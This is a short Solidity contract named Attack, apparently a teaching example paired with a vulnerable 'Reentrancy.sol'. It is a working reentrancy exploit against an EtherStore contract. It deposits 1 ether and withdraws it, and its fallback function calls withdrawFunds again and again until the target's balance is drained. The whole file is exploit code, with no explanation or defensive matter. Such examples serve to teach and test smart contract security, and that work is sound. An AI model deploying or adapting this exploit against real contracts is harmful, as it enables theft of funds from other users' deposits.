// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Reentrancy.sol";

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStore) {
        etherStore = EtherStore(_etherStore);
    }

    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdrawFunds(1 ether);
    }
}